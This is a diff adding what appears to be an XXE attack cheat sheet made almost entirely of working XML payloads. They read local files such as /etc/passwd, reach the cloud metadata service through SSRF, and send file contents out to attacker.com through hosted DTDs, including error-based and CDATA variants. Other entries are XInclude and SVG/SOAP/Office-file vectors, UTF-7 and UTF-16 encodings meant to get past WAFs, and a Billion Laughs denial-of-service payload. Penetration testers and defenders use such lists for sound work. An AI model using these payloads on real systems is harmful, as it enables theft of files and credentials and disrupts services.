@@ -1,0 +1,173 @@
+## ============================================================
+## XXE (XML External Entity) Payloads
+## ============================================================
+
+## ---- BASIC FILE READ (Linux) ----
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+## ---- BASIC FILE READ (Windows) ----
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
+]>
+<root>&xxe;</root>
+
+## ---- SSRF VIA XXE ----
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root>&xxe;</root>
+
+## ---- SSRF INTERNAL PORT SCAN ----
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
+]>
+<root>&xxe;</root>
+
+## ---- PHP FILTER (base64 encode to avoid XML parse errors) ----
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+<root>&xxe;</root>
+
+## ---- BLIND XXE WITH OUT-OF-BAND (OOB) EXFILTRATION ----
+## Step 1: Host this DTD on attacker server (evil.dtd)
+## <!ENTITY % file SYSTEM "file:///etc/passwd">
+## <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
+## %eval;
+## %exfil;
+
+## Step 2: Send this payload
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+<root>test</root>
+
+## ---- BLIND XXE VIA ERROR-BASED ----
+## evil.dtd on attacker server:
+## <!ENTITY % file SYSTEM "file:///etc/passwd">
+## <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+## %eval;
+## %error;
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil_error.dtd">
+  %xxe;
+]>
+<root>test</root>
+
+## ---- XXE IN SOAP REQUEST ----
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <getData>
+      <input>&xxe;</input>
+    </getData>
+  </soap:Body>
+</soap:Envelope>
+
+## ---- XXE IN SVG (file upload) ----
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+  <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+
+## ---- XXE IN XLSX (Excel) ----
+## 1. Rename .xlsx to .zip, extract
+## 2. Edit xl/workbook.xml or [Content_Types].xml
+## 3. Add DTD with file:// entity
+## 4. Repack as .zip, rename to .xlsx, upload
+
+## ---- XXE IN DOCX (Word) ----
+## Same approach: unzip, edit word/document.xml, inject entity, repack
+
+## ---- XXE IN PDF (via XMP metadata) ----
+## Some PDF parsers process XMP metadata XML:
+## Inject entity in XMP block inside PDF
+
+## ---- XINCLUDE ATTACK (when you can't control DOCTYPE) ----
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+
+## ---- PARAMETER ENTITY ONLY (when regular entities blocked) ----
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%xxe;'>">
+  %eval;
+  %send;
+]>
+<root>test</root>
+
+## ---- CDATA EXFILTRATION (for files with XML-breaking chars) ----
+## evil_cdata.dtd:
+## <!ENTITY % file SYSTEM "file:///etc/fstab">
+## <!ENTITY % start "<![CDATA[">
+## <!ENTITY % end "]]>">
+## <!ENTITY % eval "<!ENTITY all '%start;%file;%end;'>">
+## %eval;
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil_cdata.dtd">
+  %dtd;
+]>
+<root>&all;</root>
+
+## ---- UTF-7 ENCODED XXE ----
+<?xml version="1.0" encoding="UTF-7"?>
++ADwAIQ-DOCTYPE foo +AFs-
+  +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
++AF0-+AD4-
++ADw-root+AD4AJg-xxe;+ADw-/root+AD4-
+
+## ---- UTF-16 ENCODED XXE ----
+## Convert payload to UTF-16 encoding to bypass WAF/filters
+## iconv -f UTF-8 -t UTF-16 xxe_payload.xml > xxe_utf16.xml
+
+## ---- BILLION LAUGHS (DoS — use carefully) ----
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+]>
+<root>&lol5;</root>
+
+## ---- COMMON CONTENT TYPES TO TEST ----
+## application/xml
+## text/xml
+## application/soap+xml
+## image/svg+xml
+## application/xhtml+xml
+## application/rss+xml
+## application/atom+xml
+## application/mathml+xml
+## multipart/form-data (XML inside XLSX/DOCX)
+
+## ---- COMMON INJECTION POINTS ----
+## - XML/SOAP API endpoints
+## - File upload (SVG, XLSX, DOCX, XML, RSS)
+## - SAML SSO (XML-based authentication)
+## - Config import features
+## - Sitemap submission
+## - RSS/Atom feed parsers
